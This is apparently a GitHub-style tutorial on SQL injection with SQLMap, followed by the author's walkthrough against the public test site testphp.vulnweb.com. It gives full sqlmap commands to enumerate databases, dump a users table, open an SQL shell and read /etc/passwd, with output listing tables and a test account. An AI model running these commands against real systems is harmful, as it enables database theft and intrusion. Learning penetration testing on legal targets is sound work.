SQL Injection is a code injection technique where malicious SQL statements are inserted into input fields
allowing an attacker interact directly with a database. It is one of the most common vulnerabilities found in web applications and can lead to unauthorized access, data breaches,
and even complete system compromise.


![Screenshot_2024-12-10_14_50_39](https://github.com/user-attachments/assets/c73a63da-be5e-48f1-822f-efebd80e2f78)

we are testing in sql map
SQLMap is one of the most popular open-source penetration testing tools specifically designed for automating the process of detecting and exploiting SQL injection vulnerabilities.
which is an automated tool for detecting and exploiting SQL injection vulnerabilities. SQLMap is generally used to test whether a web application is vulnerable to SQL injection and, if so, to exploit those vulnerabilities to extract data from the database.

### How to Use SQLMap to Find Vulnerable Websites

SQLMap itself doesn't find websites on the internet; rather, it is used after you’ve identified a potentially vulnerable site or URL. It automates the process of testing that site for SQL injection vulnerabilities.
Below are the steps you can take to find vulnerable websites (with explicit permission!) and then use SQLMap to test and exploit those vulnerabilities.

### Steps to Use SQLMap for Finding Vulnerable Websites

1. Reconnaissance and Target Identification: 
   The first step is to identify a target that might be vulnerable to SQL injection. This often involves gathering information about the target website.

2. Test the Target for SQL Injection: 
   Once you’ve identified a URL or parameter, you can use SQLMap to test it for SQL injection vulnerabilities.

### 1.Identifying a Target URL or Parameter

Before using SQLMap, you need a URL with a parameter that could be potentially vulnerable to SQL injection. Common parameters to test for vulnerabilities include:

- `id=`
- `user=`
- `page=`
- `product=`
- `category=`

These parameters are often used in database queries and are common entry points for SQL injection.

#### Examples of URLs that may contain vulnerable parameters:

- `http://example.com/page.php?id=1`
- `http://example.com/product.php?id=5`
- `http://example.com/search.php?q=test`

### 2. **Manually Checking for SQL Injection (Quick Test)**

You can quickly check if a website is vulnerable to SQL injection by adding a single quote (`'`) to the parameter in the URL. For example:

- `http://example.com/page.php?id=1'`
- `http://example.com/product.php?id=5'`

If the website responds with an SQL error, there's a high chance that the parameter is vulnerable to SQL injection. However, **this is just a quick check** and doesn't mean the vulnerability is confirmed. SQLMap can help automate this process and take it further.

### 3. **Running SQLMap Against a Target URL**

Once you've identified a potentially vulnerable parameter (e.g., `id=1`), you can use SQLMap to test it for SQL injection. SQLMap will automatically detect and exploit SQL injection vulnerabilities in the provided URL.

Here’s how you would run SQLMap to check for SQL injection vulnerabilities in a URL:

#### Basic SQLMap Command

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

- `-u "http://example.com/page.php?id=1"`: Specifies the URL you want to test.
- `--batch`: Automatically answers "yes" to all prompts (useful for automation).

### 4. **Advanced SQLMap Commands**

Once SQLMap is running, it will attempt to detect if the parameter (`id` in the above example) is vulnerable to SQL injection and try different payloads to exploit it. If it finds an injection point, SQLMap will proceed to exploit it.

Here are some advanced options you can use with SQLMap:

#### 1. **Check for Specific Types of SQL Injection**:
To explicitly test for specific types of SQL injection, you can use the `--technique` option. For example:

- `--technique=BEUSTQ`: Test for **Blind**, **Error-based**, **Union-based**, **Stacked**, and **Time-based** SQL injection.

```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUSTQ --batch
```

#### 2. **Test POST Requests**:
If the SQL injection vulnerability exists in a POST request (for example, a login form), use the `--data` flag to specify the POST data.

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --batch
```

#### 3. **Using Custom Headers (like Cookies)**:
Sometimes vulnerabilities exist in cookies, HTTP headers, or other non-URL parameters. You can pass cookies or custom headers using the `--cookie` option.

```bash
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abcd1234" --batch
```

#### 4. **Enumerating Databases**:
Once SQLMap detects a vulnerability, you can use it to enumerate databases. For example, to list all databases in the target:

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch
```

This will return a list of databases available in the target system.

#### 5. **Dumping Data from a Table**:
After identifying the target database, you can dump data from a specific table. For example, to dump data from the `users` table in the `test_db` database:

```bash
sqlmap -u "http://example.com/page.php?id=1" -D test_db -T users --dump --batch
```

#### 6. **Using SQL Shell**:
You can use SQLMap’s interactive SQL shell to execute custom SQL queries against the compromised database.

```bash
sqlmap -u "http://example.com/page.php?id=1" --sql-shell
```

This opens a prompt where you can execute SQL commands directly against the target database.

#### 7. **Check for Specific SQL Injection Types**:
You can specify which type of injection you want to test for using the `--technique` option. For example:

- **T**: Time-based Blind SQL Injection
- **B**: Boolean-based Blind SQL Injection
- **E**: Error-based SQL Injection
- **U**: Union-based SQL Injection

```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=T --batch
```

This will focus SQLMap on testing **time-based** SQL injection.

### 5. **Post-Exploitation with SQLMap**

Once SQLMap successfully identifies a vulnerable parameter and exploits it, it can perform a variety of post-exploitation tasks such as:

- **Database Enumeration**: SQLMap can list all databases and tables in the vulnerable DBMS.
- **Data Dumping**: SQLMap can dump all rows from a table (e.g., usernames, passwords, etc.).
- **Privilege Escalation**: Depending on the SQL injection vulnerability, SQLMap may help escalate privileges by modifying user roles or accessing the file system.
- **Accessing the File System**: If the SQL user has sufficient privileges, SQLMap can access the file system and even read sensitive files like `/etc/passwd` on Linux or `C:\Windows\System32\drivers\etc\hosts` on Windows.

```bash
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd" --batch
```

### Key SQLMap Options

- `-u` : Specify the URL to test.
- `--data` : POST request data.
- `--cookie` : Send a cookie with the request.
- `--batch` : Automatically answer all prompts.
- `--dbs` : Enumerate databases.
- `-D` : Specify a database to target.
- `-T` : Specify a table to target.
- `--dump` : Dump data from a table.
- `--technique` : Specify injection techniques (e.g., `T`, `B`, `U`, `E`).
- `--sql-shell` : Open an interactive SQL shell.

### 6. **Ethical Considerations and Legal Concerns**

- **Get Permission**: Never run SQLMap (or any penetration testing tool) against a website without **explicit permission**. This is critical to stay within legal boundaries.
- **Bug Bounty Programs**: If you want to test websites in a legal environment, participate in **bug bounty programs** like those on **HackerOne**, **Bugcrowd**, or **Open Bug Bounty**.
- **Responsible Disclosure**: If you find vulnerabilities during authorized testing, always follow responsible disclosure practices and report the issue to the website's owner or the relevant authority.

how to retrieve data step to one by one
i testing the vulnweb.php website

first i used tool is sql map

1.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs

![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
1.we find data retrive from a database
[*] acuart
[*] information_schema
2.
![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

3.
![Screenshot_2024-12-10_15_32_48](https://github.com/user-attachments/assets/91e8900b-5610-4612-a1b9-49e7e4fa39bf)



Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

4.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns



Database: acuart
Table: users
[1 entry]
+-------+--------+------+----------+
| uname | name   | pass | address  |
+-------+--------+------+----------+
| test  | 1      | test | Me cawen |
+-------+--------+------+----------+
